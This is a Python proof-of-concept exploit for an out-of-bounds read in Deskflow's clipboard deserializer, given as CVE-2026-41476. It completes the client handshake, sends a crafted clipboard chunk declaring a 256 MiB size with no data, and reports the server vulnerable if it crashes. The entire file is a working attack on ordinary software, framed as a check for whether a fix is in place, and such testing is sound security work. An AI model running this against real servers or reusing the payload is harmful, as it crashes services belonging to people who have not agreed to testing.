#!/usr/bin/env python3
"""
CVE-2026-41476 — Deskflow clipboard unmarshall out-of-bounds read.

The deserializer at src/lib/deskflow/IClipboard.cpp::IClipboard::unmarshall
reads a `size` field from the wire and constructs `std::string(index, size)`
without verifying `size` bytes remain in the buffer. The advisory's canonical
reproducer is a 12-byte clipboard payload declaring size=4096 with zero actual
payload bytes — but whether 4096 bytes of OOB read crashes depends on heap
layout. We declare 256 MiB instead so the std::string copy ctor's memcpy is
guaranteed to walk off any plausible mapped region.

This PoC connects as a malicious client, completes the v1.8 handshake, and
pushes the bad clipboard. Reports VULNERABLE if the server drops the TCP
connection. Prereq: TLS off on target; --name must match a configured screen.
The fixed deskflow rejects the message with a `payload size … exceeds
remaining …` log line and keeps the connection alive.
"""

import argparse
import socket
import struct
import sys
import time

PROTO_MAJOR, PROTO_MINOR = 1, 8
CHUNK_START, CHUNK_DATA, CHUNK_END = 1, 2, 3
FMT_TEXT = 0


def frame(payload):
    return struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock):
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, size) if size else b""


def handshake(sock, name):
    # Server speaks first. The protocol identifier is configurable on deskflow
    # (Server::protocolString -> "Synergy" or "Barrier"); echo back whatever
    # the server sent so HelloBack is accepted regardless of the chosen mode.
    hello = recv_packet(sock)
    if len(hello) < 7 or hello[:7] not in (b"Synergy", b"Barrier"):
        raise RuntimeError(f"unexpected hello: {hello!r}")
    proto_id = hello[:7]

    name_b = name.encode()
    sock.sendall(frame(proto_id
                       + struct.pack(">HH", PROTO_MAJOR, PROTO_MINOR)
                       + struct.pack(">I", len(name_b)) + name_b))

    # Pacing matters: TCPSocket::doRead emits inputReady only when its input
    # buffer transitions empty -> non-empty. If we blast HelloBack + DInfo
    # back-to-back the server fires ONE event, ClientProxyUnknown consumes
    # HelloBack, and DInfo sits buffered with no event left to wake the new
    # ClientProxy1_X handler. Reading QINF here forces a roundtrip so DInfo
    # lands as a fresh segment.
    qinfo = recv_packet(sock)
    if not qinfo.startswith(b"QINF"):
        raise RuntimeError(f"expected QINF, got: {qinfo!r}")

    sock.sendall(frame(b"DINF" + struct.pack(">7H", 0, 0, 1920, 1080, 0, 960, 540)))


def dclp(seq, mark, data):
    return frame(b"DCLP"
                 + struct.pack(">B", 0)
                 + struct.pack(">I", seq)
                 + struct.pack(">B", mark)
                 + struct.pack(">I", len(data)) + data)


def send_malicious_clipboard(sock):
    # numFormats=1, formatId=kText, size=256 MiB, then ZERO actual payload.
    blob = struct.pack(">III", 1, FMT_TEXT, 0x10000000)
    size_str = str(len(blob)).encode()
    sock.sendall(dclp(1, CHUNK_START, size_str))
    sock.sendall(dclp(1, CHUNK_DATA, blob))
    sock.sendall(dclp(1, CHUNK_END, b""))


def is_alive(sock):
    # Detecting a crashed peer is racy. After a peer crash:
    #   - FIN: TCP allows writes after peer-FIN (half-close), so sendall
    #     would succeed and SO_ERROR stays 0. Catch with MSG_PEEK -> b"".
    #   - RST: in-flight; first send may succeed before RST arrives, so
    #     check SO_ERROR after a sleep + second send.
    time.sleep(2.0)
    sock.setblocking(False)
    try:
        if sock.recv(1, socket.MSG_PEEK) == b"":
            return False
    except BlockingIOError:
        pass
    except OSError:
        return False
    finally:
        sock.setblocking(True)
    try:
        sock.sendall(frame(b"CNOP"))
    except OSError:
        return False
    return sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--name", default="deskflow-poc",
                    help="screen name; must match a configured screen on the target server")
    args = ap.parse_args()

    print(f"CVE-2026-41476 — clipboard unmarshall OOB read")
    print(f"target: {args.host}:{args.port}  name: {args.name!r}")

    sock = socket.create_connection((args.host, args.port), timeout=5.0)
    try:
        handshake(sock, args.name)
        send_malicious_clipboard(sock)
        alive = is_alive(sock)
    finally:
        sock.close()

    if alive:
        print("[PASS] peer survived — fix is in place")
        return 0
    print("[FAIL] peer dropped TCP connection — VULNERABLE (CVE-2026-41476)")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
